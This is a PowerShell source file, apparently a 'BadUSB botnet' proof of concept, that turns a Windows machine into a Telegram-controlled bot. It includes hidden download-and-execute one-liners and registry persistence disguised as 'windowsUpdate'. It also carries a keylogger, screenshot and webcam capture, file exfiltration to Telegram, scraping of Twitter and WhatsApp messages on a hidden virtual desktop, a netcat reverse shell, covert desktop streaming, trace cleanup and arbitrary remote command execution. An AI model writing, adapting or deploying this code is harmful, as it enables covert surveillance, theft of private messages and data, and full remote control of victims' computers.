
<#  
BADUSB COMMANDS:
    # Execute 
    powershell.exe -windowstyle hidden -file this_file.ps1
    #Execute script from github
    iex ((New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/alexfrancow/badusb_botnet/master/poc.ps1'))
    PowerShell.exe -WindowStyle Hidden -Command iex ((New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/alexfrancow/badusb_botnet/master/poc.ps1'))
    PowerShell.exe -WindowStyle Minimized -Command iex ((New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/alexfrancow/badusb_botnet/master/poc.ps1'))
REGEDIT:
	reg add HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run /v windowsUpdate /t REG_SZ /d "powershell.exe -windowstyle hidden -file C:\Users\$env:username\Documents\windowsUpdate.ps1"	
    https://www.akadia.com/services/windows_registry.html 
BOT TELEGRAM:
    https://stackoverflow.com/questions/34457568/how-to-show-options-in-telegram-bot
	#>


############
## CONFIG ##
############

$BotToken = ""
$ChatID = ''
$githubScript = 'https://raw.githubusercontent.com/alexfrancow/badusb_botnet/master/poc.ps1'


###############
## FUNCTIONS ##
###############

function turnOffScreen {
    # Source: http://www.powershellmagazine.com/2013/07/18/pstip-how-to-switch-off-display-with-powershell/

    # Turn display off by calling WindowsAPI.
 
    # SendMessage(HWND_BROADCAST,WM_SYSCOMMAND, SC_MONITORPOWER, POWER_OFF)
    # HWND_BROADCAST  0xffff
    # WM_SYSCOMMAND   0x0112
    # SC_MONITORPOWER 0xf170
    # POWER_OFF       0x0002
 
    Add-Type -TypeDefinition '
    using System;
    using System.Runtime.InteropServices;
 
    namespace Utilities {
       public static class Display
       {
          [DllImport("user32.dll", CharSet = CharSet.Auto)]
          private static extern IntPtr SendMessage(
             IntPtr hWnd,
             UInt32 Msg,
             IntPtr wParam,
             IntPtr lParam
          );
 
          public static void PowerOff ()
          {
             SendMessage(
                (IntPtr)0xffff, // HWND_BROADCAST
                0x0112,         // WM_SYSCOMMAND
                (IntPtr)0xf170, // SC_MONITORPOWER
                (IntPtr)0x0002  // POWER_OFF
             );
          }
       }
    }
    '

    [Utilities.Display]::PowerOff()
}

function backdoor {
        reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run /v windowsUpdate /f
        
        Send-Message "Downloading.."
        Invoke-WebRequest -Uri $githubScript -OutFile C:\Users\$env:username\Documents\windowsUpdate.ps1

        Send-Message "Adding_to_the_reg.."
		reg add HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run /v windowsUpdate /t REG_SZ /d "powershell.exe -windowstyle hidden -file C:\Users\$env:username\Documents\windowsUpdate.ps1"

        # Check backdoor
        #$checkBackdoor = Get-CimInstance Win32_StartupCommand | Select-String windowsUpdate
        $checkBackdoor = reg query HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run | Select-String windowsUpdate
        Invoke-RestMethod -Uri "https://api.telegram.org/bot$($BotToken)/sendMessage?chat_id=$($ChatID)&text=$($checkBackdoor)"
		
        # Backdoor on startup programs
        $command = cmd.exe /c "powershell.exe -windowstyle hidden -file C:\Users\$env:username\Documents\windowsUpdate.ps1"
        Invoke-Expression -Command:$command
}

function screenshot {
      [Reflection.Assembly]::LoadWithPartialName("System.Drawing")
        function screenshot([Drawing.Rectangle]$bounds, $path) {
           $bmp = New-Object Drawing.Bitmap $bounds.width, $bounds.height
           $graphics = [Drawing.Graphics]::FromImage($bmp)

           $graphics.CopyFromScreen($bounds.Location, [Drawing.Point]::Empty, $bounds.size)

           $bmp.Save($path)

           $graphics.Dispose()
           $bmp.Dispose()
        }
        $bounds = [Drawing.Rectangle]::FromLTRB(0, 0, 1920, 1080)
        screenshot $bounds "C:\Users\$env:username\Documents\screenshot.jpg"
}

function cleanAll {
    # Remove screenshots
    Send-Message "Deleting_screenshots.."
    Remove-Item "C:\Users\$env:username\Documents\screenshot.jpg"
    # Remove cUrl
    Send-Message "Deleting_cURL.."
    Remove-Item -Recurse "C:\Users\$env:username\AppData\Local\Temp\1"
    # Remove backdoor
    Send-Message "Deleting_backdoor.."
    Remove-Item "C:\Users\$env:username\Documents\windowsUpdate.ps1"
    reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run /v windowsUpdate /f
    # Remove webcam
    Send-Message "Deleting_webcam.."
    Remove-Item "C:\Users\$env:username\Documents\CommandCam.exe"
    # Remove netcat
    Send-Message "Deleting_netcat.."
    Remove-Item -Recurse "C:\Users\$env:username\Documents\nc"
    Remove-Item "C:\Users\$env:username\Documents\nc.zip"
}

function installCurl {
    $curl = "C:\Users\" + $env:username + "\appdata\local\temp\1\curl.exe"
    if(![System.IO.File]::Exists($curl)){
        # file with path $path doesn't exist
        $ruta = "C:\Users\" + $env:username + "\appdata\local\temp\1"
        $curl_zip = $ruta + "\curl.zip"
        $curl = $ruta + "\" + "curl.exe"
        $curl_mod = $ruta + "\" + "curl_mod.exe"
        if ( (Test-Path $ruta) -eq $false) {mkdir $ruta} else {}
        if ( (Test-Path $curl_mod) -eq $false ) {$webclient = "system.net.webclient" ; $webclient = New-Object $webclient ; $webrequest = $webclient.DownloadFile("https://raw.githubusercontent.com/cybervaca/psbotelegram/master/Funciones/curl.zip","$curl_zip")
        [System.Reflection.Assembly]::LoadWithPartialName('System.IO.Compression.FileSystem') | Out-Null
        [System.IO.Compression.ZipFile]::ExtractToDirectory("$curl_zip","$ruta") | Out-Null
        }
        return $curl
    }
    # else curl exist
    return $curl    
}

function sendPhoto {
    Send-Message "Sending.."
    $uri = "https://api.telegram.org/bot" + $BotToken + "/sendPhoto"
    $photo = "C:\Users\$env:username\Documents\screenshot.jpg"
    $curl = installCurl
    $argumenlist = $uri + ' -F chat_id=' + "$ChatID" + ' -F photo=@' + $photo  + ' -k '
    Start-Process $curl -ArgumentList $argumenlist -WindowStyle Hidden
    
    Start-Sleep -Seconds 5
    Send-Message "Deleting.."
    Remove-Item $photo
    #& $curl -s -X POST "https://api.telegram.org/bot"$BotToken"/sendPhoto" -F chat_id=$ChatID -F photo="@$SnapFile"
}

function Send-Message($message) {
    $uri = "https://api.telegram.org/bot" + $BotToken + "/sendMessage"
    $curl = installCurl
    $argumenlist = $uri + ' -F chat_id=' + "$ChatID" + ' -F text=' + $message  + ' -k '
    Start-Process $curl -ArgumentList $argumenlist -WindowStyle Hidden
}

function ipPublic {
    #$ipPublic = Invoke-RestMethod http://ipinfo.io/json | Select -exp ip
    $ipPublic = Invoke-RestMethod http://ipinfo.io/json | Select-Object -Property city, region, postal, ip
    Invoke-RestMethod -Uri "https://api.telegram.org/bot$($BotToken)/sendMessage?chat_id=$($ChatID)&text=$($ipPublic)&parse_mode=html"
}

function download($FileToDownload) {
    $uri = "https://api.telegram.org/bot" + $BotToken + "/sendDocument"
    $curl = installCurl
    $argumenlist = $uri + ' -F chat_id=' + "$ChatID" + ' -F document=@' + $FileToDownload  + ' -k '
    Start-Process $curl -ArgumentList $argumenlist -WindowStyle Hidden

    #curl -F chat_id="$ChatID" -F document=@"$FileToDownload" https://api.telegram.org/bot<token>/sendDocument
}

function keylogger($seconds) {
  # Requires -Version 2
  # Signatures for API Calls
  $signatures = @'
[DllImport("user32.dll", CharSet=CharSet.Auto, ExactSpelling=true)] 
public static extern short GetAsyncKeyState(int virtualKeyCode); 
[DllImport("user32.dll", CharSet=CharSet.Auto)]
public static extern int GetKeyboardState(byte[] keystate);
[DllImport("user32.dll", CharSet=CharSet.Auto)]
public static extern int MapVirtualKey(uint uCode, int uMapType);
[DllImport("user32.dll", CharSet=CharSet.Auto)]
public static extern int ToUnicode(uint wVirtKey, uint wScanCode, byte[] lpkeystate, System.Text.StringBuilder pwszBuff, int cchBuff, uint wFlags);
'@

  $Path = "$env:temp\keylogger.txt"

  # load signatures and make members available
  $API = Add-Type -MemberDefinition $signatures -Name 'Win32' -Namespace API -PassThru
    
  # create output file
  $null = New-Item -Path $Path -ItemType File -Force

  try {
    Write-Host 'Recording..'
    Send-Message 'Recording..'

    # create endless loop. When user presses CTRL+C, finally-block
    # executes and shows the collected key presses
    $timeout = new-timespan -Seconds  $time
    $sw = [diagnostics.stopwatch]::StartNew()
    while ($sw.elapsed -lt $timeout) {
      Start-Sleep -Milliseconds 40
      
      # scan all ASCII codes above 8
      for ($ascii = 9; $ascii -le 254; $ascii++) {
        # get current key state
        $state = $API::GetAsyncKeyState($ascii)

        # is key pressed?
        if ($state -eq -32767) {
          $null = [console]::CapsLock

          # translate scan code to real code
          $virtualKey = $API::MapVirtualKey($ascii, 3)

          # get keyboard state for virtual keys
          $kbstate = New-Object Byte[] 256
          $checkkbstate = $API::GetKeyboardState($kbstate)

          # prepare a StringBuilder to receive input key
          $mychar = New-Object -TypeName System.Text.StringBuilder

          # translate virtual key
          $success = $API::ToUnicode($ascii, $virtualKey, $kbstate, $mychar, $mychar.Capacity, 0)


          if ($success) {
            # add key to logger file
            [System.IO.File]::AppendAllText($Path, $mychar, [System.Text.Encoding]::Unicode) 
          }
        }
      }
    }
  }

  finally {
    # open logger file in Notepad - Only for test
    #notepad $Path

    Write-Host "Downloading keylogger file.."
    Send-Message 'Downloading..'
    download $Path

    Start-Sleep -Seconds 5
    Write-Host "Deleting keylogger file.."
    Send-Message 'Deleting..'
    Remove-Item $Path
  }
}

function webcam {
    Send-Message "Downloading.."
    # https://batchloaf.wordpress.com/commandcam/
    $url = "https://github.com/tedburke/CommandCam/raw/master/CommandCam.exe"
    $outpath = "C:\Users\$env:username\Documents\CommandCam.exe"
    [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
    Invoke-WebRequest -Uri $url -OutFile $outpath

    Send-Message "Taking_picture.."
    $args = "/filename C:\Users\$env:username\Documents\image.jpg"
    Start-Process $outpath -ArgumentList $args -WindowStyle Hidden
    Start-Sleep -Seconds 5

    Send-Message "Sending_picture.."
    $uri = "https://api.telegram.org/bot" + $BotToken + "/sendPhoto"
    $photo = "C:\Users\$env:username\Documents\image.jpg"
    $curl = installCurl
    $argumenlist = $uri + ' -F chat_id=' + "$ChatID" + ' -F photo=@' + $photo  + ' -k '
    Start-Process $curl -ArgumentList $argumenlist -WindowStyle Hidden
    
    Start-Sleep -Seconds 5
    Send-Message "Deleting_picture.."
    Remove-Item $photo
    Remove-Item $outpath
}

function mainBrowser {
    Send-Message "Checking_main_browser_on_the_reg.."
    $mainBrowser = reg query HKEY_CURRENT_USER\Software\Microsoft\Windows\Shell\Associations\UrlAssociations\http\UserChoice

    if ($mainBrowser -match 'chrome') {
        Send-Message "Chrome!"
        $chrome = "${env:ProgramFiles(x86)}\Google\Chrome\Application\chrome.exe"
        if(![System.IO.File]::Exists($chrome)){
            $chrome = "${env:ProgramFiles}\Google\Chrome\Application\chrome.exe"
            Send-Message "Chrome x64!"
            return $chrome
        }
        Send-Message "Chromex86!"
        return $chrome
     }

    ElseIf ($mainBrowser -match 'Firefox') {
        Send-Message "Firefox!"
        $firefox = "${env:ProgramFiles(x86)}\Mozilla Firefox\firefox.exe"
        if(![System.IO.File]::Exists($firefox)){
            $firefox = "${env:ProgramFiles}\Mozilla Firefox\firefox.exe"
            Send-Message "Firefox x64!"
            return $firefox
        }
        Send-Message "Firefoxx86!"
        return $firefox
     }
}

function HackTwitterW10 {
    <#
    Creará un nuevo dekstop virtual e iniciará ahí el firefox y guardará el html, como es un desktop virtual el usuario no se enterará de lo que pasa
    Esta funcion solo es válida para W10.
    Manuales: 
        https://docs.microsoft.com/en-us/windows/desktop/inputdev/virtual-key-codes 
    #>


    # Inicia un virtual desktop.
    $KeyShortcut = Add-Type -MemberDefinition @"
[DllImport("user32.dll")]
static extern void keybd_event(byte bVk, byte bScan, uint dwFlags, UIntPtr dwExtraInfo);
//WIN + CTRL + D: Create a new desktop
public static void CreateVirtualDesktopInWin10()
{
    //Key down
    keybd_event((byte)0x5B, 0, 0, UIntPtr.Zero); //Left Windows key 
    keybd_event((byte)0x11, 0, 0, UIntPtr.Zero); //CTRL
    keybd_event((byte)0x44, 0, 0, UIntPtr.Zero); //D
    //Key up
    
    keybd_event((byte)0x5B, 0, (uint)0x2, UIntPtr.Zero);
    keybd_event((byte)0x11, 0, (uint)0x2, UIntPtr.Zero);
    keybd_event((byte)0x44, 0, (uint)0x2, UIntPtr.Zero);
}
"@ -Name CreateVirtualDesktop2 -UsingNamespace System.Threading -PassThru
   
    # Cambia al virtual desktop de la iquierda.
    $KeyShortcut2 = Add-Type -MemberDefinition @"
[DllImport("user32.dll")]
static extern void keybd_event(byte bVk, byte bScan, uint dwFlags, UIntPtr dwExtraInfo);
//WIN + CTRL + LEFT: Switch desktop
public static void SwitchLeftVirtualDesktopInWin10()
{
    //Key down
    keybd_event((byte)0x5B, 0, 0, UIntPtr.Zero); //Left Windows key 
    keybd_event((byte)0x11, 0, 0, UIntPtr.Zero); //CTRL
    keybd_event((byte)0x25, 0, 0, UIntPtr.Zero); //LEFT
    //Key up
    
    keybd_event((byte)0x5B, 0, (uint)0x2, UIntPtr.Zero);
    keybd_event((byte)0x11, 0, (uint)0x2, UIntPtr.Zero);
    keybd_event((byte)0x25, 0, (uint)0x2, UIntPtr.Zero);
}
"@ -Name SwitchLeftVirtualDesktop -UsingNamespace System.Threading -PassThru    

    # Cambia al virtual desktop de la derecha.
    $KeyShortcut3 = Add-Type -MemberDefinition @"
[DllImport("user32.dll")]
static extern void keybd_event(byte bVk, byte bScan, uint dwFlags, UIntPtr dwExtraInfo);
//WIN + CTRL + LEFT: Switch desktop
public static void SwitchRightVirtualDesktopInWin10()
{
    //Key down
    keybd_event((byte)0x5B, 0, 0, UIntPtr.Zero); //Left Windows key 
    keybd_event((byte)0x11, 0, 0, UIntPtr.Zero); //CTRL
    keybd_event((byte)0x27, 0, 0, UIntPtr.Zero); //RIGHT
    //Key up
    
    keybd_event((byte)0x5B, 0, (uint)0x2, UIntPtr.Zero);
    keybd_event((byte)0x11, 0, (uint)0x2, UIntPtr.Zero);
    keybd_event((byte)0x27, 0, (uint)0x2, UIntPtr.Zero);
}
"@ -Name SwitchRightVirtualDesktop -UsingNamespace System.Threading -PassThru    

    $KeyShortcut::CreateVirtualDesktopInWin10()
    
    # Inicia el navegador por defecto y abre twitter.
    $mainBrowser = mainBrowser 
    Start-Process $mainBrowser -ArgumentList '--new-window https://twitter.com/messages' 
    Start-Sleep -Seconds 2
    $wshell = New-Object -ComObject wscript.shell
    $KeyShortcut2::SwitchLeftVirtualDesktopInWin10()

    # Espera 10 segundos a cargar completamente la página
    Start-sleep -Seconds 10

    # Activa la ventana con el nombre: 'Iniciar sesión en Twitter'
    $KeyShortcut3::SwitchRightVirtualDesktopInWin10()
    $wshell.AppActivate('twitter') 
    $wshell.SendKeys("^{s}") 
    $wshell.AppActivate('Guardar como')
    Sleep -Seconds 2 
    $wshell.SendKeys('t') 
    Sleep -Seconds 2
    $wshell.SendKeys('~') 
    $KeyShortcut2::SwitchLeftVirtualDesktopInWin10()

    Sleep -Seconds 5
    Get-ChildItem "C:\Users\$env:username\Downloads\t_files" | Compress-Archive -DestinationPath "C:\Users\$env:username\Downloads\t_files.zip" -CompressionLevel Optimal 

    Sleep -Seconds 5
    download "C:\Users\$env:username\Downloads\t.html"
    download "C:\Users\$env:username\Downloads\t_files.zip"
        
    Sleep -Seconds 5
    Remove-Item "C:\Users\$env:username\Downloads\t.html"
    Remove-Item -Recurse "C:\Users\$env:username\Downloads\t_files"
    Remove-Item "C:\Users\$env:username\Downloads\t_files.zip"
}

function hackWhatsAPPW10 {
   <#
    No descarga las conversaciones de cada usuario, para ello habria que entrar en cada conversacion para que el JS carge de la BD de whatsapp los mensajes.
    Manuales: 
        https://docs.microsoft.com/en-us/windows/desktop/inputdev/virtual-key-codes 
    #>


    # Inicia un virtual desktop.
    $KeyShortcut = Add-Type -MemberDefinition @"
[DllImport("user32.dll")]
static extern void keybd_event(byte bVk, byte bScan, uint dwFlags, UIntPtr dwExtraInfo);
//WIN + CTRL + D: Create a new desktop
public static void CreateVirtualDesktopInWin10()
{
    //Key down
    keybd_event((byte)0x5B, 0, 0, UIntPtr.Zero); //Left Windows key 
    keybd_event((byte)0x11, 0, 0, UIntPtr.Zero); //CTRL
    keybd_event((byte)0x44, 0, 0, UIntPtr.Zero); //D
    //Key up
    
    keybd_event((byte)0x5B, 0, (uint)0x2, UIntPtr.Zero);
    keybd_event((byte)0x11, 0, (uint)0x2, UIntPtr.Zero);
    keybd_event((byte)0x44, 0, (uint)0x2, UIntPtr.Zero);
}
"@ -Name CreateVirtualDesktop2 -UsingNamespace System.Threading -PassThru
   
    # Cambia al virtual desktop de la iquierda.
    $KeyShortcut2 = Add-Type -MemberDefinition @"
[DllImport("user32.dll")]
static extern void keybd_event(byte bVk, byte bScan, uint dwFlags, UIntPtr dwExtraInfo);
//WIN + CTRL + LEFT: Switch desktop
public static void SwitchLeftVirtualDesktopInWin10()
{
    //Key down
    keybd_event((byte)0x5B, 0, 0, UIntPtr.Zero); //Left Windows key 
    keybd_event((byte)0x11, 0, 0, UIntPtr.Zero); //CTRL
    keybd_event((byte)0x25, 0, 0, UIntPtr.Zero); //LEFT
    //Key up
    
    keybd_event((byte)0x5B, 0, (uint)0x2, UIntPtr.Zero);
    keybd_event((byte)0x11, 0, (uint)0x2, UIntPtr.Zero);
    keybd_event((byte)0x25, 0, (uint)0x2, UIntPtr.Zero);
}
"@ -Name SwitchLeftVirtualDesktop -UsingNamespace System.Threading -PassThru    

    # Cambia al virtual desktop de la derecha.
    $KeyShortcut3 = Add-Type -MemberDefinition @"
[DllImport("user32.dll")]
static extern void keybd_event(byte bVk, byte bScan, uint dwFlags, UIntPtr dwExtraInfo);
//WIN + CTRL + LEFT: Switch desktop
public static void SwitchRightVirtualDesktopInWin10()
{
    //Key down
    keybd_event((byte)0x5B, 0, 0, UIntPtr.Zero); //Left Windows key 
    keybd_event((byte)0x11, 0, 0, UIntPtr.Zero); //CTRL
    keybd_event((byte)0x27, 0, 0, UIntPtr.Zero); //RIGHT
    //Key up
    
    keybd_event((byte)0x5B, 0, (uint)0x2, UIntPtr.Zero);
    keybd_event((byte)0x11, 0, (uint)0x2, UIntPtr.Zero);
    keybd_event((byte)0x27, 0, (uint)0x2, UIntPtr.Zero);
}
"@ -Name SwitchRightVirtualDesktop -UsingNamespace System.Threading -PassThru    

    $KeyShortcut::CreateVirtualDesktopInWin10()
    
    # Inicia el navegador por defecto y abre twitter.
    $mainBrowser = mainBrowser 
    Start-Process $mainBrowser -ArgumentList '--new-window https://web.whatsapp.com/' 
    Start-Sleep -Seconds 2
    $wshell = New-Object -ComObject wscript.shell
    $KeyShortcut2::SwitchLeftVirtualDesktopInWin10()

    # Espera 10 segundos a cargar completamente la página
    Start-sleep -Seconds 10

    # Activa la ventana con el nombre: 'Iniciar sesión en Twitter'
    $KeyShortcut3::SwitchRightVirtualDesktopInWin10()
    $wshell.AppActivate('Mozilla Firefox') 
    $wshell.SendKeys("^{s}") 
    $wshell.AppActivate('Guardar como')
    Sleep -Seconds 2 
    $wshell.SendKeys('w') 
    Sleep -Seconds 1 
    $wshell.SendKeys('~') 
    $KeyShortcut2::SwitchLeftVirtualDesktopInWin10()

    Sleep -Seconds 5
    Get-ChildItem "C:\Users\$env:username\Downloads\w_files" | Compress-Archive -DestinationPath "C:\Users\$env:username\Downloads\w_files.zip" -CompressionLevel Optimal

    Sleep -Seconds 5
    download "C:\Users\$env:username\Downloads\w.html"
    download "C:\Users\$env:username\Downloads\w_files.zip"

    Sleep -Seconds 5
    Remove-Item "C:\Users\$env:username\Downloads\w.html"
    Remove-Item -Recurse "C:\Users\$env:username\Downloads\w_files"
    Remove-Item "C:\Users\$env:username\Downloads\w_files.zip"
}

function netcat($ip) {
    Send-Message "Downloading_netcat.."
    $url = "https://eternallybored.org/misc/netcat/netcat-win32-1.12.zip"
    $outpath = "C:\Users\$env:username\Documents\nc.zip"
    $outpathUnzip  = "C:\Users\$env:username\Documents\nc"
    [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
    Invoke-WebRequest -Uri $url -OutFile $outpath
    
    Start-Sleep -Seconds 5
    Expand-Archive $outpath -DestinationPath $outpathUnzip
    $args = "$ip 8888 -e cmd.exe"
    $netcat = $outpathUnzip+"\nc.exe"

    Start-Sleep -Seconds 5
    Send-Message "Connecting.."
    Send-Message "IP:$ip"
    Send-Message "Port:8888"
    Start-Process $netcat -ArgumentList $args -WindowStyle Hidden
}

function stopnetcat {
    Send-Message "Stopping_netcat.."
    taskkill /F /IM nc.exe
    
    Sleep -Seconds 5
    Send-Message "Deleting_netcat.."
    Remove-Item -Recurse "C:\Users\$env:username\Documents\nc"
    Remove-Item "C:\Users\$env:username\Documents\nc.zip" 
}

function twitch($STREAM_KEY) {
    Send-Message "Downloading_FFmpeg.."
    $url = "https://ffmpeg.zeranoe.com/builds/win32/static/ffmpeg-20180828-26dc763-win32-static.zip"
    $outpath = "C:\Users\$env:username\Documents\FFmpeg.zip"
    $outpathUnzip  = "C:\Users\$env:username\Documents\FFmpeg"
    [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
    Invoke-WebRequest -Uri $url -OutFile $outpath

    Send-Message "Starting_streaming.."
    Start-Sleep -Seconds 5
    Expand-Archive $outpath -DestinationPath $outpathUnzip
    $FFmpeg = $outpathUnzip+"\ffmpeg-20180828-26dc763-win32-static\bin\ffmpeg.exe"
    Start-Process -Filepath $FFmpeg "-f gdigrab -s 1920x1080 -framerate 15 -i desktop -c:v libx264 -preset fast -pix_fmt yuv420p -s 1280x800 -threads 0 -f flv rtmp://live-mad.twitch.tv/app/$STREAM_KEY" -windowstyle hidden
}

function stoptwitch {
    Send-Message "Stopping twitch.."
    taskkill /F /IM ffmpeg.exe
    
    Sleep -Seconds 5
    Remove-Item -Recurse "C:\Users\$env:username\Documents\FFmpeg"
    Remove-Item "C:\Users\$env:username\Documents\FFmpeg.zip"
}


#####################
## BYPASS POLICIES ##
#####################

# Set-ExecutionPolicy -Scope CurrentUser -ExecutionPolicy Unrestricted


##########################
## CONNECT WITH CHANNEL ##
##########################

$whoami = Invoke-Expression whoami
$ipV4 = Test-Connection -ComputerName (hostname) -Count 1  | Select -ExpandProperty IPV4Address
$ipV4 = $ipV4.IPAddressToString
$hostname = Invoke-Expression hostname
$pwd = pwd

$info = '[!] ' + $hostname + ' - ' + $whoami + ' - ' + $ipv4 + ' ' + $pwd + '> '
if($nopreview) { $preview_mode = "True" }
if($markdown) { $markdown_mode = "Markdown" } else {$markdown_mode = ""}

$payload = @{
    "chat_id" = $ChatID;
    "text" = $info;
    "parse_mode" = $markdown_mode;
    "disable_web_page_preview" = $preview_mode;
}
Invoke-WebRequest `
    -Uri ("https://api.telegram.org/bot{0}/sendMessage" -f $BotToken) `
    -Method Post `
    -ContentType "application/json;charset=utf-8" `
    -Body (ConvertTo-Json -Compress -InputObject $payload)


######################
## WAIT FOR COMMAND ##
######################

#Time to sleep for each loop before checking if a message with the magic word was received
$LoopSleep = 3
 
 
#Get the Last Message Time at the beginning of the script:When the script is ran the first time, it will ignore any last message received!
$BotUpdates = Invoke-WebRequest -Uri "https://api.telegram.org/bot$($BotToken)/getUpdates"
$BotUpdatesResults = [array]($BotUpdates | ConvertFrom-Json).result
$LastMessageTime_Origin = $BotUpdatesResults[$BotUpdatesResults.Count-1].message.date
 
#Read the responses in a while cycle
$DoNotExit = 1
#$PreviousLoop_LastMessageTime is going to be updated at every cycle (if the last message date changes)
$PreviousLoop_LastMessageTime = $LastMessageTime_Origin
 
$SleepStartTime = [Float] (get-date -UFormat %s) #This will be used to check if the $SleepTime has passed yet before sending a new notification out
While ($DoNotExit)  {
  Sleep -Seconds $LoopSleep
  #Reset variables that might be dirty from the previous cycle
  $LastMessageText = ""
  $CommandToRun = ""
  $CommandToRun_Result = ""
  $CommandToRun_SimplifiedOutput = ""
  $Message = ""
  
  #Get the current Bot Updates and store them in an array format to make it easier
  $BotUpdates = Invoke-WebRequest -Uri "https://api.telegram.org/bot$($BotToken)/getUpdates"
  $BotUpdatesResults = [array]($BotUpdates | ConvertFrom-Json).result
  
  #Get just the last message:
  $LastMessage = $BotUpdatesResults[$BotUpdatesResults.Count-1]
  #Get the last message time
  $LastMessageTime = $LastMessage.message.date
  
  #If the $LastMessageTime is newer than $PreviousLoop_LastMessageTime, then the user has typed something!
  If ($LastMessageTime -gt $PreviousLoop_LastMessageTime)  {
    #Looks like there's a new message!
    
	#Update $PreviousLoop_LastMessageTime with the time from the latest message
	$PreviousLoop_LastMessageTime = $LastMessageTime
	#Update the LastMessageTime
	$LastMessageTime = $LastMessage.Message.Date
	#Update the $LastMessageText
	$LastMessageText = $LastMessage.Message.Text
	
	Switch -Wildcard ($LastMessageText)  {
	  "/select $ipV4 *"  { #Important: run with a space
	    #The user wants to run a command
		$CommandToRun = ($LastMessageText -split ("/select $ipV4 "))[1] #This will remove "run "
		#$Message = "Ok $($LastMessage.Message.from.first_name), I will try to run the following command on $ipV4 : `n<b>$($CommandToRun)</b>"
		#$SendMessage = Invoke-RestMethod -Uri "https://api.telegram.org/bot$($BotToken)/sendMessage?chat_id=$($ChatID)&text=$($Message)&parse_mode=html"
		
		#Run the command
		Try {
		  Invoke-Expression $CommandToRun | Out-String | %  {
		    $CommandToRun_Result += "`n $($_)"
		  }
		}
		Catch  {
		  $CommandToRun_Result = $_.Exception.Message
		}
		
		$Message = "$($LastMessage.Message.from.first_name), I've ran <b>$($CommandToRun)</b> and this is the output:`n$CommandToRun_Result"
		$SendMessage = Invoke-RestMethod -Uri "https://api.telegram.org/bot$($BotToken)/sendMessage?chat_id=$($ChatID)&text=$($Message)&parse_mode=html"
        $pwd = pwd
        $info = '[!] ' + $hostname + ' - ' + $whoami + ' - ' + $ipv4 + ' ' + $pwd + '> '
		Invoke-RestMethod -Uri "https://api.telegram.org/bot$($BotToken)/sendMessage?chat_id=$($ChatID)&text=$($info)"
	  }
	  "/stop $ipV4"  {
		#The user wants to stop the script
		write-host "The script will end in 5 seconds"
		$ExitMessage = "$($LastMessage.Message.from.first_name) has requested the script to be terminated. It will need to be started again in order to accept new messages!"
		$ExitRestResponse = Invoke-RestMethod -Uri "https://api.telegram.org/bot$($BotToken)/sendMessage?chat_id=$($ChatID)&text=$($ExitMessage)&parse_mode=html"
		Sleep -seconds 5
		$DoNotExit = 0
	  }
      "/list"  {
        Invoke-WebRequest `
        -Uri ("https://api.telegram.org/bot{0}/sendMessage" -f $BotToken) `
        -Method Post `
        -ContentType "application/json;charset=utf-8" `
        -Body (ConvertTo-Json -Compress -InputObject $payload)
      }
      "/screenshot $ipV4"{
        screenshot
        sendPhoto
      }
      "/backdoor $ipV4"  {
        backdoor
      }
      "/meterpreter $ipV4"  {
         
      }
      "/cleanAll $ipV4" {
        cleanAll
      }
      "/ipPublic $ipV4" {
        ipPublic
      }
      "/download $ipV4 *"{
        $FileToDownload = ($LastMessageText -split ("/download $ipV4 "))[1]
        download $FileToDownload
      }
      "/hackT $ipV4"{
        HackTwitterW10
      }
      "/webcam $ipV4"{
        webcam
      }
      "/hackW $ipV4"{
        hackWhatsAPPW10
      }
      "/keylogger $ipV4 *"{
        $time = ($LastMessageText -split ("/keylogger $ipV4 "))[1]
        keylogger seconds $time
      }
      "/nc $ipV4 *"{
        $ip = ($LastMessageText -split ("/nc $ipV4 "))[1]
        netcat $ip
      }
      "/stopnc $ipV4"{
        stopnetcat
      }
      "/starttwitch $ipV4 *"{
        $STREAM_KEY = ($LastMessageText -split ("/twitch $ipV4 "))[1]
        twitch $STREAM_KEY
      }
      "/stoptwitch $ipV4"{
        stoptwitch
      }
	  default  {
	    #The message sent is unknown
		$Message = "Sorry $($LastMessage.Message.from.first_name), but I don't understand ""$($LastMessageText)""!"
		$SendMessage = Invoke-RestMethod -Uri "https://api.telegram.org/bot$($BotToken)/sendMessage?chat_id=$($ChatID)&text=$($Message)&parse_mode=html"
	  }
	}
	
  }
}
